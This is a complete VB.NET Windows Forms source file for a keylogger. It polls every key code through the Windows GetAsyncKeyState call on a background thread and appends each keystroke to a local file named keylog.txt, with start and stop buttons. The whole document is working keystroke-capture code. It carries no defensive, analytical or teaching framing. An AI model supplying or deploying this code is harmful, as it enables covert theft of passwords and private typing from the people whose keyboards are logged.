Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Threading

Public Class Form1
    ' Import the necessary WinAPI function
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetAsyncKeyState(ByVal vKey As Integer) As Short
    End Function

    ' Thread for keylogging
    Private keylogThread As Thread
    Private loggingActive As Boolean = False

    ' Start button click event
    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
        If Not loggingActive Then
            loggingActive = True
            keylogThread = New Thread(AddressOf StartKeylogging)
            keylogThread.IsBackground = True
            keylogThread.Start()
            MessageBox.Show("Keylogging started!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If
    End Sub

    ' Stop button click event
    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
        If loggingActive Then
            loggingActive = False
            If keylogThread IsNot Nothing AndAlso keylogThread.IsAlive Then
                keylogThread.Join() ' Wait for the thread to finish
            End If
            MessageBox.Show("Keylogging stopped!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If
    End Sub

    ' Keylogging logic
    Private Sub StartKeylogging()
        While loggingActive
            For i As Integer = 1 To 255 ' Iterate through each key
                Dim state As Short = GetAsyncKeyState(i)

                If state = -32767 Then ' Check if the key is pressed
                    Dim key As String = ChrW(i)

                    ' Log special keys
                    Select Case i
                        Case 8 ' Backspace
                            key = "[Backspace]"
                        Case 13 ' Enter
                            key = "[Enter]"
                        Case 32 ' Space
                            key = "[Space]"
                        Case Else
                            ' Add other special key mappings if needed
                    End Select

                    ' Write the key to a log file
                    LogKey(key)
                End If
            Next

            Thread.Sleep(10) ' Add a small delay to prevent high CPU usage
        End While
    End Sub

    ' Method to log keys
    Private Sub LogKey(ByVal key As String)
        Try
            ' Specify the file to save logs
            Dim logFilePath As String = "keylog.txt"

            ' Append the key to the file
            File.AppendAllText(logFilePath, key)
        Catch ex As Exception
            ' Handle errors (e.g., file access issues)
        End Try
    End Sub
End Class
